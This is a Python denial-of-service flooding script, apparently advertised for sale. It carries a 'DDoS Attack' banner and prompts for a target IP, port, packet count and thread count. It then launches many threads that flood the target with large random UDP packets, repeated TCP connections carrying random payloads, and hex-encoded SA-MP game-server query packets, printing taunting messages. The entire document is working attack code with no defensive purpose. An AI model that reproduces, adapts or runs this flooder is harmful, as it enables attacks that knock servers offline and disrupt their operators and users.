import random
import threading
import codecs
import struct
import time
import socket
import sys
import os

print("""
\033[1;33m
╔═══╗─╔╗──────
╚╗╔╗║─║║──────
─║║║╠═╝╠══╦══╗
─║║║║╔╗║╔╗║══╣
╔╝╚╝║╚╝║╚╝╠══║
╚═══╩══╩══╩══╝
╔═══╗╔╗─╔╗─────╔╗──
║╔═╗╠╝╚╦╝╚╗────║║──
║║─║╠╗╔╩╗╔╬══╦═╣║╔╗
║╚═╝║║║─║║║╔╗║╔╣╚╝╝
║╔═╗║║╚╗║╚╣╔╗║╚╣╔╗╗
╚╝─╚╝╚═╝╚═╩╝╚╩═╩╝╚╝
Big Lider in team Li zandya is YOUPI
 that DDOS IS SELLE FOR MADARA 
""")

ip = str(input("  IP/HOST:"))
port = int(input("  PORT/HOST:"))
choice = str(input("  ATTACK BY Li zandya (y/n):"))
times = int(input(" PACKETS:"))
threads = int(input(" THREADS::"))
fake_ip = '182.21.20.32'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 2110
                       codecs.decode("021efd40","hex_codec"),#cookie port 3306
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def run():
	data = random._urandom(146000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ")
		except:
			print("[!] DOWN IP FUCKED BY Li zandya")

def run2():
	data = random._urandom(1204)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"DOWN IP FUCKED BY Li zandya")
		except:
			s.close()
			print("[*] DOWN IP FUCKED BY Li zandya")
            

def run3():
	data = random._urandom(9990)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" DOWN IP FUCKED BY Li zandya")
		except:
			s.close()
			print("[#] DOWN IP FUCKED BY Li zandya")
            
  
def run4():
	data = random._urandom(81809)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" DOWN IP FUCKED BY Li zandya")
		except:
			s.close()
			print("[*] DOWN IP FUCKED BY Li zandya")
			
def run5():
	data = random._urandom(16000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" DOWN IP FUCKED BY Li zandya")
		except:
			s.close()
			print("[!] DOWN IP FUCKED BY Li zandya")
            
#Urandom Dan Pacotes
class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(2,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 2110):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
               
         
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
else:
		th = threading.Thread(target = run5)
		th.start()